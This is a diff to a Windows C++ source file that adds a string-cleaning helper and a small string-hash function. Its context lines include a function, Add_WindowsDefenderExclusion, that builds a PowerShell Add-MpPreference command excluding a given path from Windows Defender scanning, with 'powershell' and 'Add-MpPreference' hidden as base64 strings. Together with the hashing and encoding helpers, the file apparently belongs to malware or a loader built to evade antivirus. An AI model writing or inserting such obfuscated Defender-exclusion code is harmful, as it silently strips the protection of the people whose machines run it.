@@ -51,7 +51,6 @@ std::string crc32ToHex(uint32_t crc) {
 
 #pragma endregion
 
-
 void EnableANSIColors(bool value) {
     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 
@@ -63,6 +62,13 @@ void EnableANSIColors(bool value) {
             dwMode &= ~ENABLE_VIRTUAL_TERMINAL_PROCESSING;
         SetConsoleMode(hConsole, dwMode);
     }
+}
+std::string CleanString(const std::string& str) {
+    std::string result = str;
+    result.erase(std::remove(result.begin(), result.end(), '\0'), result.end());
+    result.erase(result.find_last_not_of(" \r\n") + 1);
+    result.erase(0, result.find_first_not_of(" \r\n"));
+    return result;
 }
 void ClearLastLines(int num_lines) {
     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -404,6 +410,23 @@ std::string base64_decode(const std::string& input) {
         }
     }
     return output;
+}
+static uint32_t hash_string(const char* s)
+{
+    uint32_t hash = 0;
+
+    for (; *s; ++s)
+    {
+        hash += *s;
+        hash += (hash << 10);
+        hash ^= (hash >> 6);
+    }
+
+    hash += (hash << 3);
+    hash ^= (hash >> 11);
+    hash += (hash << 15);
+
+    return hash;
 }
 void Add_WindowsDefenderExclusion(const std::string& path) {
     std::string command = base64_decode("cG93ZXJzaGVsbA==") + " -NoLogo -NoProfile -NonInteractive -Command \"" + base64_decode("QWRkLU1wUHJlZmVyZW5jZQ==") + "-ExclusionPath '" + path + "'\"";
